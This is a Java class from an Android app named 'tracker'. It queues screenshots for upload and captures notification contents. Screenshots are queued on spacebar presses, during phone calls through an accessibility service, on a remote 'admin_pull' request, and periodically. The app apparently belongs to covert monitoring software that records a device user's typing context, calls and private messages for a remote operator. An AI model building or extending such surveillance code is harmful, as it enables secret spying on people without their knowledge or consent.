package com.tracker.app.services;

import android.util.Log;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * Thread-safe queue for pending screenshot uploads.
 */
public class UploadQueue {

    private static final String TAG = "UploadQueue";

    public static class UploadItem {
        public final File file;
        public final String triggerType;
        public final String callSessionId;
        public final String source;
        public final long capturedAt;

        public UploadItem(File file, String triggerType, String callSessionId, String source, long capturedAt) {
            this.file = file;
            this.triggerType = triggerType;
            this.callSessionId = callSessionId;
            this.source = source;
            this.capturedAt = capturedAt;
        }
    }

    public static class NotificationItem {
        public final String packageName;
        public final String title;
        public final String body;
        public final long postedAt;

        public NotificationItem(String packageName, String title, String body, long postedAt) {
            this.packageName = packageName;
            this.title = title;
            this.body = body;
            this.postedAt = postedAt;
        }
    }

    private static final ConcurrentLinkedQueue<UploadItem> queue = new ConcurrentLinkedQueue<>();
    private static final ConcurrentLinkedQueue<NotificationItem> notificationQueue = new ConcurrentLinkedQueue<>();

    public static void addSpacebarScreenshot(File file) {
        queue.add(new UploadItem(file, "spacebar", null, null, System.currentTimeMillis()));
        Log.d(TAG, "Spacebar queued. Size: " + queue.size());
    }

    public static void addCallScreenshots(SpacebarAccessibilityService.CallScreenshotResult result, String source) {
        for (int i = 0; i < result.files.size(); i++) {
            long capturedAt = i < result.capturedTimes.size()
                    ? result.capturedTimes.get(i)
                    : System.currentTimeMillis();
            queue.add(new UploadItem(
                    result.files.get(i),
                    "call",
                    result.sessionId,
                    source,
                    capturedAt
            ));
        }
        Log.d(TAG, result.files.size() + " call screenshots queued.");
    }

    public static void addRealtimeScreenshot(File file) {
        queue.add(new UploadItem(file, "admin_pull", null, null, System.currentTimeMillis()));
    }

    public static void addPeriodicScreenshot(File file) {
        queue.add(new UploadItem(file, "periodic", null, null, System.currentTimeMillis()));
        Log.d(TAG, "Periodic screenshot queued. Size: " + queue.size());
    }

    public static void requeue(UploadItem item) {
        queue.add(item);
    }

    /**
     * Drain all items from the queue and return them.
     */
    public static List<UploadItem> drain() {
        List<UploadItem> items = new ArrayList<>();
        UploadItem item;
        while ((item = queue.poll()) != null) {
            items.add(item);
        }
        return items;
    }

    public static void addNotification(String packageName, String title, String body, long postedAt) {
        notificationQueue.add(new NotificationItem(packageName, title, body, postedAt));
        Log.d(TAG, "Notification queued. Size: " + notificationQueue.size());
    }

    public static void requeueNotification(NotificationItem item) {
        notificationQueue.add(item);
    }

    public static List<NotificationItem> drainNotifications() {
        List<NotificationItem> items = new ArrayList<>();
        NotificationItem item;
        while ((item = notificationQueue.poll()) != null) {
            items.add(item);
        }
        return items;
    }

    public static int notificationsSize() {
        return notificationQueue.size();
    }

    public static int size() {
        return queue.size();
    }
}
